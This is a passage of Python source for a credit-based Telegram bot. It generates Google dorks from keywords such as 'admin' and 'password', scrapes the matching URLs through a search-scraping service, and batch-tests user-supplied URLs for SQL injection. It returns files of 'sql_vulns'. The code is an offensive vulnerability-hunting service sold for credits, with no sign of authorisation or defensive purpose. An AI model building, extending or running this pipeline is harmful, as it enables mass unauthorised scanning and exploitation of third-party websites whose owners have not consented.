            rows.append([InlineKeyboardButton(
                f"{pp['icon']}  {pp['label']}", callback_data=f"cparam_{key}"
            )])
        rows.append([InlineKeyboardButton("⬅️  Back", callback_data=f"cdtype_{dtype}")])
        text = (
            f"🛠 *Custom Builder — Step 3/4*\n{DIV}\n\n"
            f"   Dork type: {cat.get('icon','')} *{esc(cat.get('label',''))}*\n"
            f"   Site scope: {site.get('icon','')} *{esc(site.get('label',''))}*\n\n"
            f"Choose *page parameters*:\n"
        )
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    # ── Custom Step 4: Count ──
    if data.startswith("cparam_"):
        pparam = data.replace("cparam_", "")
        st = user_states.get(uid, {})
        st.update({"step": "cust_count", "page_param": pparam})
        user_states[uid] = st
        dtype = st.get("dork_type", "all")
        stype = st.get("site_type", "any")
        cat = DORK_CATEGORIES.get(dtype, {})
        site = SITE_TYPES.get(stype, {})
        pp = PAGE_PARAMS.get(pparam, {})
        rows = count_kb("ccount")
        rows.append([InlineKeyboardButton("⬅️  Back", callback_data=f"csite_{stype}")])
        text = (
            f"🛠 *Custom Builder — Step 4/4*\n{DIV}\n\n"
            f"   Dork type: {cat.get('icon','')} *{esc(cat.get('label',''))}*\n"
            f"   Site scope: {site.get('icon','')} *{esc(site.get('label',''))}*\n"
            f"   Parameters: {pp.get('icon','')} *{esc(pp.get('label',''))}*\n\n"
            f"📊 *How many dorks* to generate?\n"
        )
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.MARKDOWN_V2)
        return

    # ── Custom — count selected → ask keywords ──
    if data.startswith("ccount_"):
        max_count = int(data.replace("ccount_", ""))
        st = user_states.get(uid, {})
        st.update({"step": "keywords", "max_count": max_count})
        user_states[uid] = st
        dtype = st.get("dork_type", "all")
        stype = st.get("site_type", "any")
        pparam = st.get("page_param", "none")
        cat = DORK_CATEGORIES.get(dtype, {})
        site = SITE_TYPES.get(stype, {})
        pp = PAGE_PARAMS.get(pparam, {})
        bk = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️  Change Count", callback_data=f"cparam_{pparam}")],
            [InlineKeyboardButton("⬅️  Start Over", callback_data='mode_gen')],
        ])
        text = (
            f"🛠 *Custom Builder — Send Keywords*\n{DIV}\n\n"
            f"   Dork type: {cat.get('icon','')} *{esc(cat.get('label',''))}*\n"
            f"   Site scope: {site.get('icon','')} *{esc(site.get('label',''))}*\n"
            f"   Parameters: {pp.get('icon','')} *{esc(pp.get('label',''))}*\n"
            f"   Max dorks: `{max_count}`\n\n"
            f"✏️ Now send me your *keywords*\n"
            f"\\(one per line, or upload a \\.txt file\\)\n\n"
            f"💡 _Example — just type:_\n"
            f"`admin`\n`password`\n`config`\n\n"
            f"🆓 This is *free* — no credits needed\\!"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=bk)
        return

# ──────────────────────────────────────────────
#  CORE PROCESSING
# ──────────────────────────────────────────────

async def process_input(update: Update, context: ContextTypes.DEFAULT_TYPE, lines: list):
    uid = update.effective_user.id
    uid_s = str(uid)
    st = user_states.get(uid, {})
    mode = st.get("mode")
    logger.info("process: user=%s mode=%s items=%d", uid_s, mode, len(lines))

    if not mode:
        await update.message.reply_text(
            "⚠️ *No mode selected\\!*\n\nTap /start first\\.",
            parse_mode=ParseMode.MARKDOWN_V2)
        return

    # ── GENERATOR ──
    if mode == "GENERATOR":
        step = st.get("step")
        if step != "keywords":
            await update.message.reply_text(
                "⚠️ *Please complete the setup first\\!*\n\n"
                "Use the buttons above to finish configuration\\.",
                parse_mode=ParseMode.MARKDOWN_V2)
            return

        gen_type = st.get("gen_type", "custom")
        max_count = st.get("max_count", 500)

        if gen_type == "preset":
            preset_key = st.get("preset", "combo")
            preset = PRESETS.get(preset_key, {})
            label = preset.get("label", "Preset")
            icon = preset.get("icon", "🛠")

            status = await update.message.reply_text(
                f"{icon} *Generating {esc(label)}\\.\\.\\.*\n{DIV}\n\n"
                f"   Keywords: `{len(lines)}`\n"
                f"   Max dorks: `{max_count}`\n\n{pbar(0, 1)}",
                parse_mode=ParseMode.MARKDOWN_V2)

            dorks = build_preset_dorks(lines, preset_key, max_count)

        else:
            dtype = st.get("dork_type", "all")
            stype = st.get("site_type", "any")
            pparam = st.get("page_param", "none")
            cat = DORK_CATEGORIES.get(dtype, {})
            site = SITE_TYPES.get(stype, {})
            pp = PAGE_PARAMS.get(pparam, {})
            icon = "🛠"
            label = "Custom Dorks"

            status = await update.message.reply_text(
                f"🛠 *Generating Custom Dorks\\.\\.\\.*\n{DIV}\n\n"
                f"   Type: {cat.get('icon','')} {esc(cat.get('label',''))}\n"
                f"   Scope: {site.get('icon','')} {esc(site.get('label',''))}\n"
                f"   Params: {pp.get('icon','')} {esc(pp.get('label',''))}\n"
                f"   Keywords: `{len(lines)}`\n"
                f"   Max dorks: `{max_count}`\n\n{pbar(0, 1)}",
                parse_mode=ParseMode.MARKDOWN_V2)

            dorks = build_custom_dorks(lines, dtype, stype, pparam, max_count)

        out = io.BytesIO("\n".join(dorks).encode())
        out.name = f"dorks_{gen_type}_{len(dorks)}.txt"

        ud = get_user(uid_s)
        ud["uses"] = ud.get("uses", 0) + 1
        db[uid_s] = ud; save_db(db)

        await status.edit_text(
            f"✅ *{esc(label)} — Done\\!*\n{DIV}\n\n"
            f"   Keywords: `{len(lines)}`\n"
            f"   Dorks generated: `{len(dorks)}`\n"
            f"   Limit: `{max_count}`\n\n{pbar(1, 1)}\n\n"
            f"📄 File attached below ⬇️",
            parse_mode=ParseMode.MARKDOWN_V2)

        await update.message.reply_document(
            document=out,
            caption=f"{icon} {len(dorks)} dorks from {len(lines)} keywords")
        return

    # ── PARSER / SQL ──
    cost = len(lines) * 5
    ud = get_user(uid_s)
    credits = ud.get("credits", 0)

    if credits < cost:
        await update.message.reply_text(
            f"❌ *Not Enough Credits*\n{DIV}\n\n"
            f"   Required: `{cost}` \\({len(lines)} × 5\\)\n"
            f"   Balance: `{credits}`\n\n"
            f"Use /redeem `KEY` to add more\\.",
            parse_mode=ParseMode.MARKDOWN_V2)
        return

    is_parser = mode == "PARSER"
    icon = "🔎" if is_parser else "💉"
    label = "Deep Parser" if is_parser else "SQL Tester"
    item_w = "dorks" if is_parser else "URLs"
    thread_info = f"\n   ⚡ Threads: `{PARSER_THREADS}` concurrent\n" if is_parser else "\n"

    status = await update.message.reply_text(
        f"{icon} *{esc(label)} — Running*\n{DIV}\n\n"
        f"   Items: `{len(lines)}` {item_w}\n"
        f"   Cost: `{cost}` credits{thread_info}\n"
        f"{pbar(0, len(lines))}\n\n⏳ Please wait\\.\\.\\.",
        parse_mode=ParseMode.MARKDOWN_V2)

    results = []
    errors = 0
    done_count = 0
    lock = asyncio.Lock()

    try:
        async with aiohttp.ClientSession() as session:
            if is_parser:
                async def _parse_worker(dork):
                    nonlocal done_count, errors
                    try:
                        urls = await fetch_oxylabs(session, dork)
                        if isinstance(urls, list):
                            async with lock:
                                results.extend(urls)
                        else:
                            async with lock:
                                errors += 1
                    except Exception as e:
                        logger.error("Parser worker err: %s", e)
                        async with lock:
                            errors += 1
                    async with lock:
                        done_count += 1
                        d = done_count
                    if d % 2 == 0 or d == len(lines):
                        try:
                            await status.edit_text(
                                f"{icon} *{esc(label)} — Running*\n{DIV}\n\n"
                                f"   Processed: `{d}/{len(lines)}` {item_w}\n"
                                f"   Found: `{len(results)}` URLs\n"
                                f"   ⚡ Threads: `{PARSER_THREADS}`\n\n"
                                f"{pbar(d, len(lines))}\n\n⏳ Please wait\\.\\.\\.",
                                parse_mode=ParseMode.MARKDOWN_V2)
                        except Exception:
                            pass

                tasks = [_parse_worker(d) for d in lines]
                await asyncio.gather(*tasks, return_exceptions=True)
            else:
                batch_size = 5
                for i in range(0, len(lines), batch_size):
                    chunk = lines[i:i + batch_size]
                    batch = await asyncio.gather(
                        *(check_sql(session, url) for url in chunk),
                        return_exceptions=True)
                    for r in batch:
                        if isinstance(r, Exception):
                            errors += 1
                        elif r:
                            results.append(r)
                    done_count = min(i + batch_size, len(lines))
                    try:
                        await status.edit_text(
                            f"{icon} *{esc(label)} — Running*\n{DIV}\n\n"
                            f"   Scanned: `{done_count}/{len(lines)}` URLs\n"
                            f"   Vulns found: `{len(results)}`\n\n"
                            f"{pbar(done_count, len(lines))}\n\n⏳ Please wait\\.\\.\\.",
                            parse_mode=ParseMode.MARKDOWN_V2)
                    except Exception:
                        pass

    except Exception as e:
        logger.error("Session err: %s\n%s", e, traceback.format_exc())
        await status.edit_text(
            f"❌ *Error*\n{DIV}\n\n   `{esc(str(e))}`\n\nCredits were *not* deducted\\.",
            parse_mode=ParseMode.MARKDOWN_V2)
        return

    ud["credits"] -= cost
    ud["uses"] = ud.get("uses", 0) + 1
    db[uid_s] = ud; save_db(db)

    final = list(set(results))
    logger.info("%s done: user=%s raw=%d unique=%d credits=%d", mode, uid_s, len(results), len(final), ud["credits"])

    err_note = f"\n   ⚠️ Errors: `{errors}`\n" if errors else ""

    if not final:
        rw = "results" if is_parser else "vulnerabilities"
        await status.edit_text(
            f"{icon} *{esc(label)} — Complete*\n{DIV}\n\n"
            f"   Scanned: `{len(lines)}` {item_w}\n"
            f"   {esc(rw.title())}: `0`{err_note}\n\n"
            f"{pbar(1, 1)}\n\n💰 Remaining: `{ud['credits']}`",
            parse_mode=ParseMode.MARKDOWN_V2)
    else:
        tag = "parsed_urls" if is_parser else "sql_vulns"
        f_out = io.BytesIO("\n".join(final).encode())
        f_out.name = f"{tag}_{datetime.now().strftime('%H%M%S')}.txt"
        await status.edit_text(
            f"{icon} *{esc(label)} — Complete*\n{DIV}\n\n"
            f"   Scanned: `{len(lines)}` {item_w}\n"
            f"   Results: `{len(final)}`{err_note}\n\n"
            f"{pbar(1, 1)}\n\n💰 Remaining: `{ud['credits']}`\n\n📄 File attached below ⬇️",
            parse_mode=ParseMode.MARKDOWN_V2)
        await update.message.reply_document(
            document=f_out,
            caption=f"{icon} {len(final)} results — credits: {ud['credits']}")

# ──────────────────────────────────────────────
#  INPUT HANDLERS
# ──────────────────────────────────────────────

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    uid = update.effective_user.id
    st = user_states.get(uid, {})
    if not st.get("mode"):
        await update.message.reply_text(
            "⚠️ *No mode selected\\!* Tap /start first\\.",
            parse_mode=ParseMode.MARKDOWN_V2)
        return
    try:
        tg_file = await context.bot.get_file(update.message.document.file_id)
        raw = await tg_file.download_as_bytearray()
        lines = [l.strip() for l in raw.decode("utf-8").splitlines() if l.strip()]
        if not lines:
            await update.message.reply_text(
                "⚠️ *Empty file\\!* Make sure it has one item per line\\.",
                parse_mode=ParseMode.MARKDOWN_V2)
            return
        await process_input(update, context, lines)
    except Exception as e:
        logger.error("file err: %s\n%s", e, traceback.format_exc())
        await update.message.reply_text(
            f"❌ *File Error:* `{esc(str(e))}`",
            parse_mode=ParseMode.MARKDOWN_V2)

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id): return
    if not update.message or not update.message.text: return
    uid = update.effective_user.id
    st = user_states.get(uid, {})
    if not st.get("mode"): return
    text = update.message.text.strip()
    if text.startswith("/"): return
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    if not lines: return
    await process_input(update, context, lines)

# ──────────────────────────────────────────────
#  MAIN
# ──────────────────────────────────────────────

if __name__ == "__main__":
    logger.info("Starting bot...")
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("balance", cmd_balance))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("key", cmd_key))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), file_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    logger.info("Bot ready — polling...")
    app.run_polling()
